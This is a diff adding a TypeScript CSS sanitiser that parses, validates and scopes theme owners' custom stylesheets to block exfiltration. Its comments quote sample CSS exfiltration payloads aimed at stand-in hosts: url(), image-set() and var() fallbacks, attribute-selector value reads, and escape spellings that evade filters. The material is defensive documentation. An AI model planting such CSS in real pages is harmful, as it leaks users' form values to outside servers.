@@ -1,0 +1,453 @@
+/**
+ * The owner's free-form CSS: validated structurally, then scoped to its theme.
+ *
+ * ## What this is defending against
+ *
+ * Not the owner. The owner can already deface their own instance through
+ * branding, and this feature exists because the token schema cannot cover every
+ * component. Two other things:
+ *
+ * 1. **A theme pasted from the internet.** Themes export and import as JSON, so
+ *    an owner can and will paste one somebody else wrote. Arbitrary CSS in a
+ *    page is a data-exfiltration channel with no JavaScript involved: with
+ *    `img-src 'self' data: https:` in the CSP — which remote posters require —
+ *    `background-image: url(https://attacker/?x)` is permitted, and attribute
+ *    selectors turn that into a character-by-character read of any input's value
+ *    (`input[value^="a"] { background: url(…/a) }`). The victims are the
+ *    instance's members, not the owner.
+ * 2. **A stolen owner session.** Persistent, JavaScript-free exfiltration on
+ *    every page for every member is a better foothold than most XSS, and it
+ *    survives a password change. Hence `requireFreshAuth` on the route: this is
+ *    a re-authenticate-to-change setting, like erasing an account.
+ *
+ * ## Why it parses instead of blocklisting substrings
+ *
+ * Because a substring blocklist for `url(` is not a defence. CSS lets an
+ * identifier be escaped (`u\72 l(`), lets a comment sit inside a function name
+ * (`ur/**\/l(`), is case-insensitive, and accepts `\0075` for `u`. Every one of
+ * those defeats `includes('url(')` and none of them defeats a parser.
+ *
+ * `css-tree` is that parser, and this is the place the token schema's own note
+ * predicted it would earn its keep — the token grammars turned out small enough
+ * to hand-write, and this one is not.
+ *
+ * The rule is structural: the AST may contain no `Url` node anywhere, no
+ * function outside an allow-list, no at-rule outside a short list, and none of a
+ * very short list of refused properties — `position` above all, which is the one
+ * attack that needs no exfiltration channel. See `REFUSED_PROPERTIES`.
+ *
+ * ## Why functions are allow-listed and not just `Url`
+ *
+ * Because "no `Url` node" is not the same as "no URL", and review found the gap
+ * by trying it: css-tree produces a `Url` node for `url(…)` and nothing of the
+ * sort for `image-set("https://evil/x" 1x)`, where the URL is a plain `String`
+ * argument. That is not a css-tree quirk — CSS Images 4 genuinely lets these
+ * functions take a bare string, and `image-set()` works in every browser this
+ * application supports. `-webkit-image-set()`, `cross-fade()` and the newer
+ * `src()` are the same shape. All four were accepted before this list existed,
+ * which reopened precisely the exfiltration channel the module is here to close.
+ *
+ * Enumerating the url-bearing functions would repeat the mistake: `src()` is
+ * recent, and the next one is not written yet. So the list runs the other way —
+ * the functions theming legitimately needs, and nothing else. A new CSS function
+ * that fetches is refused on the day it ships, without anybody noticing it
+ * shipped.
+ *
+ * The cost is real and accepted: an owner using something unusual and harmless
+ * gets refused, with the function named so the list can grow on evidence. That
+ * is the same trade `ALLOWED_AT_RULES` already makes.
+ *
+ * Selectors are untouched by this. `:is()`, `:not()`, `:has()` and `:nth-child()`
+ * parse as `PseudoClassSelector`, never as `Function` — verified rather than
+ * assumed, because an allow-list that silently ate `:not()` would be worse than
+ * the hole it closes.
+ *
+ * ## The property that makes this work at all
+ *
+ * The output is REGENERATED from the AST, never passed through. So a browser can
+ * only ever see css-tree's interpretation of the input, which closes the whole
+ * class of parser-differential attacks — there is no "css-tree read it as X and
+ * Chrome reads it as Y", because Chrome never sees the original bytes.
+ *
+ * ## Two cases that are not obvious
+ *
+ * **Custom properties.** css-tree parses `--x: anything` as a `Raw` value, and
+ * correctly so: custom properties have no grammar. But a `Raw` that is never
+ * inspected is a hole, and a specific one — this application uses
+ * `var(--bg-pattern-image)` in `background-image`, so `--bg-pattern-image:
+ * url(https://evil)` would load. Custom property values are therefore reparsed
+ * in a value context and walked like everything else.
+ *
+ * **`@keyframes` are global.** Selector prefixing cannot scope them, so a
+ * theme's `@keyframes spin` would silently redefine an animation the rest of the
+ * site — and every other theme — uses. Each declared name is renamed with the
+ * theme's slug, and the `animation` / `animation-name` references inside the
+ * same stylesheet are rewritten to match, so the feature keeps working and the
+ * leak closes.
+ */
+import * as csstree from 'css-tree';
+// The lists live in the shared package so the admin editor can warn against the
+// same rules while you type. This module remains the only thing that REFUSES:
+// it has the parser, and the editor has a courtesy.
+import {
+  ALLOWED_AT_RULES,
+  ALLOWED_FUNCTIONS,
+  MAX_CUSTOM_CSS_BYTES,
+  REFUSED_PROPERTIES,
+} from '@trackarr/shared/css';
+
+export { MAX_CUSTOM_CSS_BYTES };
+
+/**
+ * The shape a property name must have.
+ *
+ * This exists because `REFUSED_PROPERTIES` is the module's ONLY blocklist — the
+ * at-rules and the functions are allow-lists, closed by default — and a
+ * blocklist is only as good as its ability to recognise what it is looking at.
+ *
+ * css-tree decodes CSS escapes in at-rule names and in function names, so
+ * `@imp\6frt` and `u\72l(` are both caught. It does NOT decode them in
+ * `Declaration.property`: `p\6fsition` arrives spelled exactly that way, misses
+ * the lookup, and `csstree.generate` re-emits it byte for byte — where the
+ * browser decodes it and applies `position: fixed`. Found in review, verified in
+ * both halves: css-tree accepts it, and a rendering engine draws the overlay.
+ *
+ * Rather than decode escapes here — which means implementing CSS Syntax §4.3.7
+ * and being right about it — the name has to LOOK like a property. No real one
+ * needs an escape, a non-ASCII letter, or anything but letters, digits and
+ * hyphens, so refusing the rest costs nothing and closes the class instead of
+ * the three spellings that happen to be on the list today.
+ *
+ * The same applies to custom properties: `--bg-pattern-imag\65` is a way of
+ * writing `--bg-pattern-image`, which this application feeds straight into
+ * `background-image`.
+ */
+const PROPERTY_NAME = /^-{0,2}[A-Za-z][A-Za-z0-9-]*$/;
+
+/** Properties that reference an animation by name. */
+const ANIMATION_PROPS = /^(animation|animation-name|-webkit-animation|-webkit-animation-name)$/i;
+
+export interface CssIssue {
+  readonly line: number;
+  readonly reason: string;
+}
+
+export type CssResult =
+  | { readonly ok: true; readonly css: string }
+  | { readonly ok: false; readonly issues: readonly CssIssue[] };
+
+function lineOf(node: csstree.CssNode): number {
+  return node.loc?.start.line ?? 0;
+}
+
+/**
+ * Rewrite one selector so it only matches under the theme's root.
+ *
+ * `html` and `:root` are replaced rather than prefixed — `:root[data-theme='x']
+ * html` matches nothing, since `html` has no `html` ancestor. Everything else,
+ * `body` and `*` included, becomes a descendant.
+ *
+ * The slug is interpolated into a selector that is then reparsed, which would be
+ * an injection point if a slug could contain a quote. `SLUG_PATTERN` in
+ * `utils/themes.ts` is what makes that impossible: lowercase letters, digits and
+ * single hyphens, enforced at creation and frozen afterwards.
+ */
+function scopeSelector(selector: string, slug: string): string {
+  const root = `:root[data-theme='${slug}']`;
+  const trimmed = selector.trim();
+  // `\b` treats `|` and `-` as boundaries, so `html|div` and `:root--x` had
+  // their type name eaten and came out as invalid selectors the browser drops.
+  // Failing closed, but silently — this fails to match instead, and the whole
+  // selector is prefixed as a descendant like anything else.
+  const head = /^(html|:root)(?![-\w|])/i.exec(trimmed);
+  return head ? root + trimmed.slice(head[0].length) : `${root} ${trimmed}`;
+}
+
+/**
+ * Validate, rename the keyframes, regenerate. Does NOT scope — see
+ * `scopeCustomCss`.
+ *
+ * The split is not tidiness. A theme's CSS has to be emitted under more than one
+ * selector: its own `[data-theme='slug']`, and again under
+ * `[data-theme='system']` when an admin maps that theme to a half of system
+ * mode. Storing it pre-scoped would make the second emission a string
+ * substitution on the slug, which is exactly the kind of thing that works until
+ * an owner writes `.nocturne-card` and it does not.
+ *
+ * So what is STORED is validated and regenerated but unscoped, and scoping
+ * happens per emission. The emitter still never has to trust the column, because
+ * the column already went through the parser.
+ *
+ * Returns every problem at once, because the alternative is an owner fixing a
+ * twenty-rule stylesheet one round trip at a time.
+ */
+export function sanitiseCustomCss(source: string, slug: string): CssResult {
+  const issues: CssIssue[] = [];
+
+  if (Buffer.byteLength(source, 'utf8') > MAX_CUSTOM_CSS_BYTES) {
+    return {
+      ok: false,
+      issues: [
+        {
+          line: 0,
+          reason: `Too long: ${MAX_CUSTOM_CSS_BYTES} bytes maximum, because every enabled theme's CSS is in the one stylesheet each visitor downloads.`,
+        },
+      ],
+    };
+  }
+
+  let ast: csstree.CssNode;
+  try {
+    ast = csstree.parse(source, {
+      positions: true,
+      // Parse values and preludes into real nodes rather than leaving them as
+      // `Raw`. Without this the walk below would see one opaque blob per
+      // declaration and could not find a `url()` inside it.
+      parseValue: true,
+      parseRulePrelude: true,
+      parseAtrulePrelude: true,
+      onParseError(error) {
+        issues.push({ line: error.line ?? 0, reason: `Could not parse: ${error.message}` });
+      },
+    });
+  } catch (err) {
+    return {
+      ok: false,
+      issues: [{ line: 0, reason: `Could not parse: ${(err as Error).message}` }],
+    };
+  }
+
+  const urlRefusal =
+    'url() is not allowed: it turns a stylesheet into a way of telling another server who visited this page, with no JavaScript needed.';
+
+  const functionRefusal = (name: string) =>
+    `${name}() is not allowed. A theme may call arithmetic, colour, gradient, ` +
+    `filter, transform, easing, track-size and shape functions; anything else ` +
+    `is refused, because some CSS functions take a URL as a plain string — ` +
+    `image-set() and src() among them — and a list of the ones that do would be ` +
+    `out of date by the next CSS release.`;
+
+  /**
+   * The rules that apply to any value, wherever it appears.
+   *
+   * Shared so a custom property gets exactly the same treatment as a normal
+   * declaration: an earlier version checked custom properties for `Url` only,
+   * which let `--x: image-set("https://evil" 1x)` through — and the application
+   * itself feeds custom properties into `background-image` via
+   * `var(--bg-pattern-image)`, so that value would have been fetched.
+   *
+   * ## Why it reparses `Raw`
+   *
+   * Because a walk only sees nodes, and css-tree does not always build them.
+   * A `var()` FALLBACK is parsed as one childless `Raw`: for
+   * `var(--nope, url(https://evil/x))` the walk sees a `var` Function — which is
+   * allowed, correctly — and never sees the `Url` sitting inside its second
+   * argument. Both rules below were therefore skipped, and every function this
+   * module refuses could be smuggled through a fallback whose custom property
+   * nothing defines, so the fallback always wins. An adversarial review found it
+   * and confirmed the requests firing in Chrome, including the
+   * `input[value^="h"]` character-by-character read this module exists to stop.
+   *
+   * `env()` was never affected — css-tree parses its fallback into real nodes —
+   * which is exactly why the gap in `var()` went unnoticed.
+   *
+   * So any `Raw` reachable from a value is parsed again in value context and
+   * walked. The depth cap is a fail-CLOSED backstop: a value that is still
+   * producing opaque text after that many rounds is refused rather than
+   * accepted, because "this cannot be inspected" and "this is fine" are not the
+   * same answer.
+   */
+  const MAX_RAW_DEPTH = 8;
+
+  function checkValue(value: csstree.CssNode, line: number, depth = 0) {
+    const raws: string[] = [];
+    csstree.walk(value, {
+      enter(node) {
+        if (node.type === 'Url') {
+          issues.push({ line, reason: urlRefusal });
+        } else if (node.type === 'Function') {
+          if (!ALLOWED_FUNCTIONS.has(node.name.toLowerCase())) {
+            issues.push({ line, reason: functionRefusal(node.name) });
+          }
+        } else if (node.type === 'Raw') {
+          raws.push(node.value);
+        }
+      },
+    });
+
+    for (const raw of raws) {
+      if (!raw.trim()) continue;
+      if (depth >= MAX_RAW_DEPTH) {
+        issues.push({
+          line,
+          reason:
+            'This value nests too deeply to be checked, so it is not accepted.',
+        });
+        continue;
+      }
+      let inner: csstree.CssNode;
+      try {
+        inner = csstree.parse(raw, { context: 'value', positions: false });
+      } catch {
+        issues.push({
+          line,
+          reason: 'Not a value this can check, so not accepted.',
+        });
+        continue;
+      }
+      checkValue(inner, line, depth + 1);
+    }
+  }
+
+  csstree.walk(ast, {
+    enter(node) {
+      switch (node.type) {
+        case 'Url':
+          issues.push({ line: lineOf(node), reason: urlRefusal });
+          break;
+        case 'Function':
+          // Reached for functions in declaration values AND in at-rule preludes
+          // (`@media (min-width: calc(…))`). Selector pseudo-classes are a
+          // different node type and never land here.
+          if (!ALLOWED_FUNCTIONS.has(node.name.toLowerCase())) {
+            issues.push({ line: lineOf(node), reason: functionRefusal(node.name) });
+          }
+          break;
+        case 'Atrule':
+          if (!ALLOWED_AT_RULES.has(node.name.toLowerCase())) {
+            issues.push({
+              line: lineOf(node),
+              reason: `@${node.name} is not allowed. Permitted: ${[...ALLOWED_AT_RULES]
+                .map((a) => '@' + a)
+                .join(', ')}.`,
+            });
+          }
+          break;
+        case 'Declaration': {
+          // The shape first, for custom and ordinary properties alike. A name
+          // this does not recognise is a name the refusal list below cannot
+          // recognise either — see `PROPERTY_NAME`.
+          if (!PROPERTY_NAME.test(node.property)) {
+            issues.push({
+              line: lineOf(node),
+              reason:
+                `${node.property}: not a property name. Letters, digits and ` +
+                `hyphens only — an escape sequence in a property name is a way ` +
+                `of spelling one this stylesheet refuses.`,
+            });
+            break;
+          }
+          const refusal = node.property.startsWith('--')
+            ? undefined
+            : REFUSED_PROPERTIES[node.property.toLowerCase()];
+          if (refusal) {
+            issues.push({ line: lineOf(node), reason: refusal });
+          }
+          // EVERY declaration value goes through `checkValue`, custom property
+          // or not. The top-level cases above catch a `Url` or a `Function` that
+          // css-tree built a node for; only `checkValue` reparses the `Raw` that
+          // a `var()` fallback becomes, and that was the way past both of them.
+          checkValue(node.value, lineOf(node));
+          break;
+        }
+      }
+    },
+  });
+
+  if (issues.length) {
+    // The top-level walk and `checkValue` both see an ordinary declaration's
+    // `Url` and `Function` nodes, deliberately — the first also covers at-rule
+    // preludes, the second also covers what a `Raw` hides. Overlapping cover is
+    // the point; saying the same thing twice to the owner is not.
+    const seen = new Set<string>();
+    const unique = issues.filter((i) => {
+      const key = `${i.line}\u0000${i.reason}`;
+      if (seen.has(key)) return false;
+      seen.add(key);
+      return true;
+    });
+    return { ok: false, issues: unique };
+  }
+
+  // ── Rename the keyframes, then their references ──────────────────────
+  const renamed = new Map<string, string>();
+  csstree.walk(ast, {
+    visit: 'Atrule',
+    enter(node) {
+      if (!node.name.toLowerCase().endsWith('keyframes')) return;
+      const prelude = node.prelude;
+      if (!prelude || prelude.type !== 'AtrulePrelude') return;
+      for (const child of prelude.children) {
+        if (child.type === 'Identifier' || child.type === 'String') {
+          const from = child.type === 'String' ? child.value : child.name;
+          // `--`, not `-`. A single hyphen is not injective across themes:
+        // slug `a` naming `b-x` and slug `a-b` naming `x` both produce `a-b-x`,
+        // and keyframes are global, so one theme would silently redefine the
+        // other's animation for every visitor using it. `SLUG_PATTERN` forbids a
+        // double hyphen in a slug, which is what makes this separator unambiguous.
+        const to = `${slug}--${from}`;
+          renamed.set(from, to);
+          Object.assign(child, { type: 'Identifier', name: to });
+        }
+      }
+    },
+  });
+
+  if (renamed.size) {
+    csstree.walk(ast, {
+      visit: 'Declaration',
+      enter(node) {
+        if (!ANIMATION_PROPS.test(node.property)) return;
+        csstree.walk(node.value, {
+          visit: 'Identifier',
+          enter(id) {
+            const to = renamed.get(id.name);
+            if (to) id.name = to;
+          },
+        });
+      },
+    });
+  }
+
+  return { ok: true, css: csstree.generate(ast) };
+}
+
+/**
+ * Prefix every selector so the CSS only applies under one theme's root.
+ *
+ * Called at emit time, once per selector the theme needs to answer to — its own
+ * slug, and `system` when it is mapped to a half of system mode.
+ *
+ * Input is assumed to have been through `sanitiseCustomCss` already. It is
+ * parsed again here rather than manipulated as text, because a selector is not a
+ * string with a prefix: `html`, `:root` and a comma-separated list each need
+ * different handling, and a regex that gets two of the three right is worse than
+ * no regex.
+ */
+export function scopeCustomCss(css: string, slug: string): string {
+  if (!css.trim()) return '';
+  let ast: csstree.CssNode;
+  try {
+    ast = csstree.parse(css, { parseRulePrelude: true });
+  } catch {
+    // Unreachable through the routes, and a silent drop rather than a broken
+    // stylesheet if a row is ever edited by hand into something unparseable.
+    return '';
+  }
+  csstree.walk(ast, {
+    visit: 'Rule',
+    enter(node) {
+      if (node.prelude.type !== 'SelectorList') return;
+      // Rules inside `@keyframes` have `from`/`to`/percentage preludes, not
+      // selectors. Prefixing one produces `:root[data-theme='x'] from`, a valid
+      // selector for an element called `from` — so the animation silently stops
+      // working rather than failing loudly.
+      if ((this.atrule?.name ?? '').toLowerCase().endsWith('keyframes')) return;
+      for (const selectorItem of node.prelude.children) {
+        const scoped = scopeSelector(csstree.generate(selectorItem), slug);
+        Object.assign(selectorItem, csstree.parse(scoped, { context: 'selector' }));
+      }
+    },
+  });
+  return csstree.generate(ast);
+}
